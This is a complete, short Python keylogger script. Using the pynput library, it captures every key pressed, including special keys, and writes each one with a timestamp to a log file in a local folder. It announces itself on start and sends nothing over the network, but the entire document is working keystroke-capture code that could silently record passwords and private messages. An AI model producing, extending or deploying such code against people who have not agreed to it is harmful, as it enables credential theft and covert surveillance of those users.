from pynput import keyboard
import logging
import os
from datetime import datetime

# Create a logs directory if it doesn't exist
if not os.path.exists("logs"):
    os.makedirs("logs")

# Create a unique log file with timestamp
log_file = f"logs/keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"

# Logging setup
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s',
)

# What happens when a key is pressed
def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

# Start listening to the keyboard
def start_keylogger():
    print("Keylogger started... Press CTRL + C to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
